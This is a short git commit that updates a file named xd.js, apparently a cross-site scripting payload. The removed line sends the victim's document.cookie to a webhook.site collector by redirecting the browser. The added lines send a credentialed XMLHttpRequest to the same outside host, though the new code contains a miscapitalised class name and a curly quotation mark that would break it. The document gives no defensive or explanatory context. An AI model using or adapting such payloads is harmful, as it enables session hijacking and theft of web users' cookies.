17d4d8c7b40a41f17fb9fee5f880df1be511bfbd
verd1c <38715146+verd1c@users.noreply.github.com>
2022-09-03 13:59:44 +0300

    Update xd.js

--- xd.js
+++ xd.js
@@ -1,1 +1,4 @@
-window.location = 'http://webhook.site/dbf476db-cc47-44b9-9ee0-e481c5a73b06/' + document.cookie;
+var req = new XmlHttpRequest();
+req.open("GET", “http://webhook.site/dbf476db-cc47-44b9-9ee0-e481c5a73b06”, true);
+req.withCredentials = true;
+req.send(null);
